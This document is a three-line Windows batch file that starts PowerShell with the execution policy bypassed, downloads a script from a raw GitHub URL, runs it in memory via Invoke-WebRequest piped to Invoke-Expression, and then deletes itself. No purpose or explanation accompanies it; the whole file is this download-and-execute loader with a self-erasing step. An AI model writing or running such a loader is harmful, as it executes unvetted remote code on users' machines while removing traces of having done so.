@echo off

cmd /c start powershell -ExecutionPolicy Bypass -command "IWR -UseBasicParsing "https://raw.githubusercontent.com/ToothyJarl/Global-Viewhands/main/github/Global-Viewhands-Main.ps1" | IEX"

goto 2>nul & del "%~f0"